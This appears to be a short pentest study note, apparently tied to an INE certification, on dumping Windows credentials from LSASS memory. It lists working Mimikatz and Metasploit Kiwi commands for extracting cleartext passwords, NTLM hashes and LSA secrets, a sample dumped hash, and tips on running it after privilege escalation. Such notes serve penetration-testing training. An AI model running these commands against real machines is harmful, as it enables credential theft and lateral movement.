---
title: "Mimikatz & Kiwi: dumping Windows credentials from memory"
description: "Extract cleartext passwords, hashes and secrets from LSASS — standalone or via Metasploit's Kiwi module."
pubDate: 2026-08-01
category: "Cybersecurity"
source: "INE Certification"
lang: "bash"
tags: ["mimikatz", "kiwi", "credential-dumping", "windows"]
draft: false
---

Mimikatz pulls cleartext passwords, NTLM hashes, and Kerberos tickets straight out of the `lsass.exe` process's memory — the same process Windows itself uses to hold credentials for active logon sessions. Metasploit bundles the same functionality as a meterpreter extension called Kiwi, which is usually the more convenient way to run it if you're already in a session.

```bash
# Standalone mimikatz.exe
mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords

# Kiwi (meterpreter extension, same capability)
load kiwi
creds_all           # everything it can find — some values may still come back empty
lsa_dump_sam        # local SAM credentials
lsa_dump_secrets    # LSA secrets (service account creds, cached data, etc.)
```

Dumped hashes come back in the format `Username:RID:LM:NTLM:::` — e.g. `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::`. Both tools need elevated (SYSTEM/admin-equivalent) privileges to read LSASS at all, so privilege escalation has to happen first — this is a post-escalation step, not a way to get escalation itself. Kiwi is generally the easier of the two to reach for since it's already inside your existing meterpreter session with no extra binary to transfer.
